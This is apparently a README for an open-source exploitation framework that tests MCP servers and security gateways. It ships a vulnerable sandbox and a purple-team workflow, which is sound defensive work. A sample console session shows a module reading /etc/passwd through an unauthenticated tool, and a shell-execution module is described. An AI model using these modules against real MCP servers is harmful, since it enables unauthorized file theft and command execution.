# mcp-sploit

**A Metasploit-style exploitation framework for testing MCP servers and MCP security gateways.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/)

> ⚠️ For authorized security testing only. Use against your own infrastructure,
> the bundled `target_server` sandbox, or systems you have explicit permission
> to test. Never run modules against production systems.

---

## What it does

`mcp-sploit` provides a `msfconsole`-style interactive shell for probing MCP
(Model Context Protocol) servers — the same servers AI agents connect to for
tool access. It speaks the real JSON-RPC 2.0 MCP protocol (`initialize`,
`tools/list`, `tools/call`), so it works against:

- A raw MCP server (no auth, exposes dangerous tools)
- An [`mcp-aegis`](https://github.com/Prasanna-27eng/mcp-aegis) gateway sitting
  in front of one — letting you validate that the gateway actually blocks
  the attacks `mcp-sploit` demonstrates.

---

## Quick start

```bash
pip install -e .

mcp-sploit
```

```
mcp-sploit > show modules
auxiliary/scanner/mcp_enum
exploit/mcp/file_exfiltration
exploit/mcp/shell_exec

mcp-sploit > use exploit/mcp/file_exfiltration
mcp-sploit exploit(exploit/mcp/file_exfiltration) > set TARGET http://localhost:8765
TARGET => http://localhost:8765

mcp-sploit exploit(exploit/mcp/file_exfiltration) > check
[*] Checking target MCP server at http://localhost:8765...
[*] Sending tools/list request...
[+] Target is an MCP server. Tools exposed: ['read_file', 'execute_shell']
[+] Target appears VULNERABLE (exposes 'read_file' without auth).

mcp-sploit exploit(exploit/mcp/file_exfiltration) > exploit
[*] Starting MCP file exfiltration attack...
[*] Connecting to http://localhost:8765...
[+] Connected successfully.
[*] Calling tool 'read_file' with path='/etc/passwd'...
[+] Tool executed: read_file
[+] File content retrieved:
────────────────────────────────────────────────────────────
root:x:0:0:root:/root:/bin/bash
...
────────────────────────────────────────────────────────────
[!] VULNERABILITY CONFIRMED: MCP server allowed unauthorized file read.
```

---

## The sandbox

This repo ships an intentionally vulnerable MCP server (`target_server/`) for
deterministic, isolated testing — never test exploit modules against
production.

```bash
docker compose up -d
docker compose exec mcp-sploit mcp-sploit
```

Inside the console, point `TARGET` at `http://vulnerable-mcp:8765`.

---

## Console commands

```
show modules|exploits|auxiliary   list available modules
search <keyword>                  search module paths
use <module/path>                 select a module
info                               show module details and options
show options                       show current module's options
set <OPTION> <value>               set an option
unset <OPTION>                     reset an option to its default
check                               run a safe, non-destructive vulnerability probe
exploit / run                      execute the module
back                                deselect the current module
exit / quit                        leave the console
```

---

## Modules

| Module | Type | Description |
|---|---|---|
| `auxiliary/scanner/mcp_enum` | auxiliary | Enumerates tools via `tools/list`, flags high-risk tool names |
| `exploit/mcp/file_exfiltration` | exploit | Reads arbitrary files via an unauthenticated `read_file` tool |
| `exploit/mcp/shell_exec` | exploit | Executes arbitrary shell commands via an unauthenticated `execute_shell` tool |

Every module exposes a `TARGET` option — the MCP server URL, **or** an
`mcp-aegis` gateway URL. Pointing `TARGET` at a gateway with the default
policy turns these exploits into a purple-team test: `block_shell_execution`
and `block_credential_reads` should reject both attacks.

---

## Purple team: validating mcp-aegis

```bash
# Run mcp-aegis in front of the vulnerable target
mcp-aegis serve --upstream http://vulnerable-mcp:8765 --port 8766

# Point mcp-sploit at the gateway instead of the raw target
mcp-sploit exploit(exploit/mcp/shell_exec) > set TARGET http://localhost:8766
mcp-sploit exploit(exploit/mcp/shell_exec) > exploit
[-] Exploit failed: [-32600] Shell execution tools allow arbitrary code
    execution and bypass all downstream controls.
[!] ATTACK MITIGATED: target rejected the request (...)
```

Verify the block was logged: `mcp-aegis logs --tail`.

---

## Testing

```bash
pip install -e ".[dev]"
pytest
```

---

## Companion projects

- [AegisTrace](https://github.com/Prasanna-27eng/AegisTrace) — Trust OS that makes AI agent actions auditable and human-approved.
- [mcp-aegis](https://github.com/Prasanna-27eng/mcp-aegis) — MCP security gateway; blocks dangerous tool calls by default.

---

## License

MIT
